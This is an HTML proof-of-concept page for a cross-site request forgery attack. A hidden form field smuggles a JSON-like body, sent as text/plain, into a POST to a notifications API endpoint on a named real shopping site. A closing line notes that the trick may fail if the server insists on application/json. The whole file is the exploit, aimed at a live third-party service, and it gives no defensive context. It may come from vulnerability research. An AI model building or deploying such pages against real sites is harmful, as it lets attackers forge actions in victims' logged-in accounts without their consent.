<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Manual CSRF PoC</title>
</head>
<body>
  <h2>Manual CSRF PoC - Submit JSON-like payload</h2>

  <form action="https://www.temu.com/api/bg/lome/user/notifications/record" method="POST" enctype="text/plain">
    <input type="hidden" name='{"id"' value='2,"type":3,"status":0}'>
    <input type="submit" value="Submit CSRF Request">
  </form>

  <p>⚠️ This method uses `enctype="text/plain"` and is unlikely to work if the server strictly expects `application/json` with a raw JSON body.</p>
</body>
</html>
